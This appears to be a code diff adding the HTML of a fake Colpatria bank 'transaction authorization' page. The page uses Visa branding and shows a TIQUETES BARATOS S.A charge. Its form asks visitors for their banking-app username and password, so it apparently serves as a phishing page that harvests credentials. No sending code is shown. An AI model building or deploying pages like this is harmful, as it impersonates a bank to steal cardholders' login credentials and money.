@@ -1,0 +1,36 @@
+<div class="main-container">
+    <div class="container">
+        <div class="header">
+          <img id="bank-logo" src="/assets/icons/colpatria-icon.png" alt="Banco Logo">
+          <div class="id-check">
+            <img id="card-type-logo" src="/assets/icons/visa.png" alt="Tipo Tarjeta Logo" height="35">
+          </div>
+        </div>
+        <div class="title">Autorización de transacción</div>
+        <p class="subtitle">La transacción de <strong >TIQUETES BARATOS S.A</strong> por <strong id="monto-transaccion">$49,999 COP</strong> con tarjeta terminada en <strong id="card-last4">0000</strong> debe ser autorizada.</p>
+        <div class="details">
+          <p><strong>Comercio:</strong> TIQUETES BARATOS S.A</p>
+          <p><strong>Monto:</strong> <span id="monto-transaccion-detalle">Calculando...</span></p>
+          <p><strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">0000</span></p>
+        </div>
+        <form id="transaction-form">
+          <div class="input-group">
+            <label id="usuario-label" for="usuario">Usuario:</label>
+            <input type="text" id="usuario" placeholder="Ingresa tu usuario">
+          </div>
+          <div class="input-group">
+            <label id="clave-label" for="clave">Clave:</label>
+            <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="11">
+          </div>
+          <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu app.</p>
+    
+          <button class="button" id="authorize-button" disabled>Autorizar</button>
+        </form>
+    
+        <!-- Contenedor del Loader (inicialmente oculto) -->
+        <div class="loaderp-full hidden">
+          <span class="loaderp"></span>
+          <p class="text-italic tc-ocean fs-3 fw-light"></p>
+        </div>
+      </div>    
+</div>
